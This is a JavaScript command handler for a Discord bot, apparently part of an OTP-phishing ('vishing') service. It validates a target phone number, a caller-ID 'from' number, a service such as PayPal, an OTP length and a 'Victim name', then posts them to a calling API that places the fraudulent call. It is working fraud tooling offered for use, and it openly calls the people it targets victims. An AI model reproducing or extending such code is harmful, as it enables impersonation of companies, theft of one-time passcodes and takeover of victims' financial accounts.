module.exports = function(m) {
    /**
     * Instantiating function dependencies.
     */
    const axios = require('axios');
    const qs = require('qs');

    /**
     * Importing the config file containing the BOT data.
     */
    const config = require('../config');

    /**
     * Function allowing you to send embeds to discord.
     */
    const embed = require('../embed');

    /**
     * If the command is not call, then end the function.
     */
    if (m.command !== "call" && m.command !== "calltest") return false;

    /**
     * If the command does not contain 2 arguments, end the function and return an error.
     */
    if(m.args.length < 3) return embed(m.message, 'Need more arguments', 15158332, 'You need to give 5 arguments, example : **.call 3361234567 5155856414 paypal 6 Pizza**', m.user);
    
    /**
     * If the phone number or service does not match the regex, then return an error.
     */
    if(!m.args['0'].match(/^\d{8,14}$/g)) return embed(m.message, 'Bad phone number', 15158332, 'This user phone number is not good, a good one : **33612345678**', m.user);
    if(!m.args['1'].match(/^\d{8,14}$/g)) return embed(m.message, 'Bad phone number', 15158332, 'This from phone number is not good, a good one : **5155856414** check #from-numbers', m.user);
    if(!m.args['2'].match(/[a-zA-Z]+/gm)) return embed(m.message, 'Bad service name', 15158332, 'This service name is not good, a good one : **paypal**', m.user);
    if(!m.args['3'].match(/[0-9]/) || m.args['2'] > 30) return embed(m.message, 'Bad otp length', 15158332, 'This otp length is not good, a good one : **6** or **8** (can\'t be superior to 50)', m.user);
    
    /**
     * If the command is !calltest then we go to a test call with the user test.
     */
    m.user = m.command == "calltest" ? 'test' : m.user;
    m.args['3'] = m.args['3'] == undefined ? '' : m.args['3'];

    /**
     * If all conditions have been passed, then send a request to the calling api.
     */
    err = null;
    axios.post(config.apiurl + '/call/', qs.stringify({
        password: config.apipassword,
        to: m.args['0'],
        user: m.user,
        from: m.args['1'],
        otplength: m.args['3'],
        service: m.args['2'].toLowerCase(),
        name: m.args['4'] || null
    }))
    .then(d => {
        if(d.data.error != undefined || d.data.error != null) {
            return embed(m.message, ':boom: Call Error :boom:', 15158332, d.data.error, m.user)
        }
    })
    .catch(error => {
        console.error(error)
    })

    /**
     * Response saying that the api call was made successfully.
     */

    return embed(m.message, ':boom: Call started :boom:', 15158332, '☎️ Calling: **' + m.args['0'] + '** \n\n :mobile_phone: From: **' + m.args['1'] + '**\n\n ☂️ Victim name: **' + m.args['4'] + '** \n\n 🏢 Company: **' + m.args['2'] + '**.', m.user)
}